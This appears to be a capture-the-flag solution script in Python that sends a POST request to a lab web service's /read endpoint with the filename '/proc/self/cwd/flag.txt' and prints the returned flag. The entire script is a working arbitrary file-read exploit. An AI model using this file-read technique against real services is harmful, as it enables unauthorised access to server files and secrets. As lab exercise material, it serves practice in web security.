from requests import *
URL="http://172.19.0.2:3001/read"

data={'filename':'/proc/self/cwd/flag.txt'}

r=post(URL,data=data)

print(f"flag = {r.text}")